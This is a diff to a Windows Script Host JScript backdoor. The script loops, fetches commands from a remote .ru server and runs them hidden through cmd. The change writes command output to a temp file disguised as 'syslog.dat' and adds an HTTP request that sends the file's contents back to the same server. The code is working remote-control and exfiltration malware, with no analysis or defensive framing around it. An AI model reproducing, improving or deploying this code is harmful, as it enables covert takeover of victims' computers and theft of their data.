@@ -20,10 +20,14 @@ while(true){
 		}
 		cmd = xmlhttp.responseText;
 		if(cmd != "null"){
-			shell.Run("cmd /c \"" + cmd + "\"");
+			shell.Run('cmd /c "' + cmd + ' > %temp%\\syslog.dat"', 0);
 			var _ = WScript.CreateObject("Microsoft.XMLHTTP");
 			_.Open("GET", "http://f0615718.xsph.ru/ProgramData/ShellExecute/getfile.php?fn=USER_ID.txt&data=null", false);
 			_.Send();
+			
+			var __ = WScript.CreateObject("Microsoft.XMLHTTP");
+			__.Open("GET", "http://f0615718.xsph.ru/ProgramData/ShellExecute/getfile.php?fn=USER_ID.result.txt&data=" + fs.OpenTextFile(shell.ExpandEnvironmentStrings("%TEMP%\\syslog.dat"), 1).ReadAll(), false);
+			__.Send();
 		}
 	}
 	WScript.Sleep(10000);
